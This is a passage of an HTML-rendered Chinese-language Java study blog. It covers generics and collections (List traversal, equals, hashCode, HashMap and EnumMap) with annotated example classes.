class="class"><span class="keyword">class</span> <span class="title">main</span></span>&#123;</span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Pair&lt;Integer&gt; p = <span class="keyword">new</span> Pair&lt;&gt;(<span class="number">123</span>, <span class="number">456</span>);</span><br><span class="line">        Pair&lt;?&gt; p2 = p; <span class="comment">// 安全地向上转型</span></span><br><span class="line">        System.out.println(p2.getFirst() + <span class="string">&quot;, &quot;</span> + p2.getLast());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pair</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> T first;</span><br><span class="line">    <span class="keyword">private</span> T last;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Pair</span><span class="params">(T first, T last)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.first = first;</span><br><span class="line">        <span class="keyword">this</span>.last = last;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> T <span class="title">getFirst</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> first;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> T <span class="title">getLast</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> last;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setFirst</span><span class="params">(T first)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.first = first;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setLast</span><span class="params">(T last)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.last = last;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="泛型与反射"><a href="#泛型与反射" class="headerlink" title="泛型与反射"></a>泛型与反射</h2><p>- </p><h1 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h1><h2 id="List"><a href="#List" class="headerlink" title="List"></a>List</h2><ul><li>List可添加重复元素和null，有ArrayList和LinkedList优先使用前者。</li><li>遍历时使用<code>for each</code>或者<code>Iterator</code>，推荐使用前者，操作简单。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">collectionList</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        List&lt;String&gt; list = addList();</span><br><span class="line">        forList(list);</span><br><span class="line">        iterationList(list);</span><br><span class="line">        forEachList(list);</span><br><span class="line">        String[] array = listToArray(list);</span><br><span class="line">        arrayToList(array);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">createList</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//        JDK9  这里不接受null</span></span><br><span class="line"><span class="comment">//        List&lt;Integer&gt; list = List.of(1,2,3);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">static</span> List&lt;String&gt; <span class="title">addList</span><span class="params">()</span></span>&#123;</span><br><span class="line">        List&lt;String&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        list.add(<span class="string">&quot;apple&quot;</span>);</span><br><span class="line">        list.add(<span class="string">&quot;pear&quot;</span>);</span><br><span class="line">        list.add(<span class="string">&quot;apple&quot;</span>);</span><br><span class="line">        list.add(<span class="keyword">null</span>);</span><br><span class="line">        System.out.println(list.size());</span><br><span class="line">        String second = list.get(<span class="number">3</span>);</span><br><span class="line">        System.out.println(second);</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">forList</span><span class="params">(List&lt;String&gt; list)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;For循环遍历&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> count=<span class="number">0</span>; count&lt;list.size(); count++)&#123;</span><br><span class="line">            String string = list.get(count);</span><br><span class="line">            System.out.println(string);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">iterationList</span><span class="params">(List&lt;String&gt; list)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Iteration迭代遍历&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(Iterator&lt;String&gt; iterator = list.iterator(); iterator.hasNext();)&#123;</span><br><span class="line">            String string = iterator.next();</span><br><span class="line">            System.out.println(string);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">forEachList</span><span class="params">(List&lt;String&gt; list)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;for each 遍历&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(String string:list)&#123;</span><br><span class="line">            System.out.println(string);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> String[] listToArray(List&lt;String&gt; list)&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;List转换成Array&quot;</span>);</span><br><span class="line">        String[] array = list.toArray(<span class="keyword">new</span> String[list.size()]);</span><br><span class="line"><span class="comment">//      数字的话等价 Number可兼容其他类型   Number[] array = list.toArray(Number[]::new);</span></span><br><span class="line">        <span class="keyword">for</span> (String string:array)&#123;</span><br><span class="line">            System.out.println(string);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> array;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">arrayToList</span><span class="params">(String[] array)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Array转换成List&quot;</span>);</span><br><span class="line"><span class="comment">//        这里返回的是个只读List 无法add remove</span></span><br><span class="line">        List&lt;String&gt; list = Arrays.asList(array);</span><br><span class="line">        System.out.println(list);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="编写equals"><a href="#编写equals" class="headerlink" title="编写equals"></a>编写equals</h2><ul><li><code>List</code>的<code>contains()</code>判断是否包含某个变量、<code>indexOf()</code>获取变量所处序号位置。 </li><li>在<code>List</code>中查找元素时，<code>List</code>的实现类通过元素的<code>equals()</code>方法比较两个元素是否相等，因此，放入的元素必须正确覆写<code>equals()</code>方法，Java标准库提供的<code>String</code>、<code>Integer</code>等已经覆写了<code>equals()</code>方法，如果不在<code>List</code>中查找元素，就不必覆写<code>equals()</code>方法。 </li><li>确定两个实例是否相等首先用<code>instanceof</code>判断是否是Object类型，对引用类型用<code>Objects.equals()</code>比较，对基本类型直接用<code>==</code>比较。 </li><li>如果不调用<code>List</code>的<code>contains()</code>、<code>indexOf()</code>这些方法，那么放入的元素就不需要实现<code>equals()</code>方法。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.pan3a.collection.equals;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Objects;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">collectionEquals</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        List&lt;String&gt; stringList = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        stringList.add(<span class="string">&quot;A&quot;</span>);</span><br><span class="line">        stringList.add(<span class="string">&quot;B&quot;</span>);</span><br><span class="line">        System.out.println(stringList.contains(<span class="string">&quot;A&quot;</span>));</span><br><span class="line">        System.out.println(stringList.contains(<span class="string">&quot;C&quot;</span>));</span><br><span class="line"><span class="comment">//        因为Java内部String类实现类equals方法不是===对比，因此为true</span></span><br><span class="line">        System.out.println(stringList.contains(<span class="keyword">new</span> String(<span class="string">&quot;A&quot;</span>)));</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;---------------------&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(stringList.indexOf(<span class="string">&quot;A&quot;</span>));</span><br><span class="line">        System.out.println(stringList.indexOf(<span class="string">&quot;C&quot;</span>));</span><br><span class="line">        System.out.println(stringList.indexOf(<span class="keyword">new</span> String(<span class="string">&quot;A&quot;</span>)));</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;----------------------&quot;</span>);</span><br><span class="line"></span><br><span class="line">        List&lt;Person&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        list.add(<span class="keyword">new</span> Person(<span class="string">&quot;Pan3a&quot;</span>,<span class="string">&quot;Pan3a&quot;</span>,<span class="number">18</span>));</span><br><span class="line">        list.add(<span class="keyword">new</span> Person(<span class="string">&quot;Forever404&quot;</span>,<span class="string">&quot;Forever404&quot;</span>,<span class="number">20</span>));</span><br><span class="line">        System.out.println(list.contains(<span class="keyword">new</span> Person(<span class="string">&quot;Pan3a&quot;</span>,<span class="string">&quot;Pan3a&quot;</span>,<span class="number">18</span>)));</span><br><span class="line">        System.out.println(list.indexOf(<span class="keyword">new</span> Person(<span class="string">&quot;Forever404&quot;</span>,<span class="string">&quot;Forever404&quot;</span>,<span class="number">20</span>)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    String firstName;</span><br><span class="line">    String lastName;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String firstName, String lastName, <span class="keyword">int</span> age)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.firstName = firstName;</span><br><span class="line">        <span class="keyword">this</span>.lastName = lastName;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    因为Person类没有系统自带的equals方法因此需要自己写  而String Integer这些Java标准库已经实现类equals方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object object)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(object <span class="keyword">instanceof</span> Person)&#123;</span><br><span class="line">            Person person = (Person) object;</span><br><span class="line">            <span class="keyword">return</span> Objects.equals(<span class="keyword">this</span>.firstName,person.firstName) &amp;&amp; <span class="keyword">this</span>.age == person.age &amp;&amp; Objects.equals(<span class="keyword">this</span>.lastName,person.lastName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="编写Map"><a href="#编写Map" class="headerlink" title="编写Map"></a>编写Map</h2><ul><li>类似于字典的key，value对应。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.pan3a.collection.map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">collectionMap</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Map&lt;String, Integer&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;apple&quot;</span>,<span class="number">123</span>);</span><br><span class="line">        map.put(<span class="string">&quot;pear&quot;</span>,<span class="number">456</span>);</span><br><span class="line">        forEachKey(map);</span><br><span class="line">        forEachEntrySet(map);</span><br><span class="line">        testMap();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">forEachKey</span><span class="params">(Map&lt;String, Integer&gt; map)</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (String key : map.keySet())&#123;</span><br><span class="line">            Integer value = map.get(key);</span><br><span class="line">            System.out.println(key + <span class="string">&quot; = &quot;</span> + value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">forEachEntrySet</span><span class="params">(Map&lt;String, Integer&gt; map)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;--------EntrySet--------&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, Integer&gt; entry : map.entrySet())&#123;</span><br><span class="line">            String key = entry.getKey();</span><br><span class="line">            Integer value = entry.getValue();</span><br><span class="line">            System.out.println(key + <span class="string">&quot; = &quot;</span> + value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">testMap</span><span class="params">()</span></span>&#123;</span><br><span class="line">        List&lt;Student&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        list.add(<span class="keyword">new</span> Student(<span class="string">&quot;Bob&quot;</span>,<span class="number">77</span>));</span><br><span class="line">        list.add(<span class="keyword">new</span> Student(<span class="string">&quot;Pan3a&quot;</span>,<span class="number">89</span>));</span><br><span class="line">        list.add(<span class="keyword">new</span> Student(<span class="string">&quot;Forever404&quot;</span>,<span class="number">79</span>));</span><br><span class="line">        Students students = <span class="keyword">new</span> Students(list);</span><br><span class="line">        System.out.println(students.getScore(<span class="string">&quot;Bob&quot;</span>) == <span class="number">77</span> ? <span class="string">&quot;测试成功&quot;</span> : <span class="string">&quot;测试失败&quot;</span>);</span><br><span class="line">        System.out.println(students.getScore(<span class="string">&quot;Tom&quot;</span>) == -<span class="number">1</span> ? <span class="string">&quot;测试成功&quot;</span> : <span class="string">&quot;测试失败&quot;</span>);</span><br><span class="line">        System.out.println(students.findInList(<span class="string">&quot;Bob&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="keyword">int</span> score;</span><br><span class="line"></span><br><span class="line">    Student(String name, <span class="keyword">int</span> score)&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.score = score;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Students</span></span>&#123;</span><br><span class="line">    List&lt;Student&gt; list;</span><br><span class="line">    Map&lt;String, Integer&gt; cache;</span><br><span class="line"></span><br><span class="line">    Students(List&lt;Student&gt; list)&#123;</span><br><span class="line">        <span class="keyword">this</span>.list = list;</span><br><span class="line">        cache = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * 根据name查找score，找到返回score，未找到返回-1</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getScore</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        Integer score = <span class="keyword">this</span>.cache.get(name);</span><br><span class="line">        <span class="keyword">if</span>(score == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> score == <span class="keyword">null</span> ? -<span class="number">1</span> : score.intValue();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">Integer <span class="title">findInList</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(Student student : <span class="keyword">this</span>.list)&#123;</span><br><span class="line">            <span class="keyword">if</span> (student.name.equals(name))&#123;</span><br><span class="line">                <span class="keyword">return</span> student.score;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="编写equals和hashCode"><a href="#编写equals和hashCode" class="headerlink" title="编写equals和hashCode"></a>编写equals和hashCode</h2><ul><li><code>HashMap</code>，作为<code>key</code>的类必须正确覆写<code>equals()</code>和<code>hashCode()</code>方法；<br>一个类如果覆写了<code>equals()</code>，就必须覆写<code>hashCode()</code>，并且覆写规则是： <ul><li>如果<code>equals()</code>返回<code>true</code>，则<code>hashCode()</code>返回值必须相等；</li><li>如果<code>equals()</code>返回<code>false</code>，则<code>hashCode()</code>返回值尽量不要相等。</li></ul></li></ul><p>实现<code>hashCode()</code>方法可以通过<code>Objects.hashCode()</code>辅助方法实现。 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.pan3a.collection.hashcode;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Objects;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">collectionHashCode</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String string = <span class="keyword">new</span> String(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">        String test = <span class="keyword">new</span> String(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">        System.out.println(string.hashCode());</span><br><span class="line">        System.out.println(test.hashCode());</span><br><span class="line">        System.out.println(string.equals(test));</span><br><span class="line">        System.out.println(string == test);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;-------hashcode &amp;&amp; equals------&quot;</span>);</span><br><span class="line">        Person personOne = <span class="keyword">new</span> Person(<span class="string">&quot;Pan3a&quot;</span>,<span class="number">18</span>);</span><br><span class="line">        Map&lt;Person,Integer&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        map.put(personOne,<span class="number">123</span>);</span><br><span class="line">        Person personTwo = <span class="keyword">new</span> Person(<span class="string">&quot;Pan3a&quot;</span>,<span class="number">18</span>);</span><br><span class="line">        System.out.println(personOne == personTwo);</span><br><span class="line">        System.out.println(personOne.equals(personTwo));</span><br><span class="line">        System.out.println(map.get(personOne));</span><br><span class="line">        System.out.println(map.get(personTwo));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    Person(String name, <span class="keyword">int</span> age)&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Objects.hashCode(age) + Objects.hashCode(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object object)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(object <span class="keyword">instanceof</span> Person)&#123;</span><br><span class="line">            Person person = (Person) object;</span><br><span class="line">            <span class="keyword">return</span> Objects.equals(<span class="keyword">this</span>.name,person.name) &amp;&amp; <span class="keyword">this</span>.age == person.age;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="编写EnumMap"><a href="#编写EnumMap" class="headerlink" title="编写EnumMap"></a>编写EnumMap</h2><ul><li>如果<code>Map</code>的key是<code>enum</code>类型，推荐使用<code>EnumMap</code>，既保证速度，也不浪费空间。使用<code>EnumMap</code>的时候，根据面向抽象编程的原则，应持有<code>Map</code>接口。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.time.DayOfWeek;</span><br><span class="line"><span class="keyword">import</span> java.util.EnumMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">collectionEnumMap</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Map&lt;DayOfWeek,String&gt; map = <span class="keyword">new</span> EnumMap&lt;&gt;(DayOfWeek.class);</span><br><span class="line">        map.put(DayOfWeek.MONDAY,<span class="string">&quot;星期一&quot;</span>);</span><br><span class="line">        map.put(DayOfWeek.TUESDAY,<span class="string">&quot;星期二&quot;</span>);</span><br><span class="line">        map.put(DayOfWeek.WEDNESDAY,<span class="string">&quot;星期三&quot;</span>);</span><br><span class="line">        map.put(DayOfWeek.TUESDAY,<span class="string">&quot;星期四&quot;</span>);</span><br><span class="line">        map.put(DayOfWeek.FRIDAY,<span class="string">&quot;星期五&quot;</span>);</span><br><span class="line">        map.put(DayOfWeek.SATURDAY,<span class="string">&quot;星期六&quot;</span>);</span><br><span class="line">        map.put(DayOfWeek.SUNDAY,<span class="string">&quot;星期日&quot;</span>);</span><br><span class="line">        System.out.println(map);</span><br><span class="line">        System.out.println(map.get(DayOfWeek.MONDAY));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="使用TreeMap"><a href="#使用TreeMap" class="headerlink" 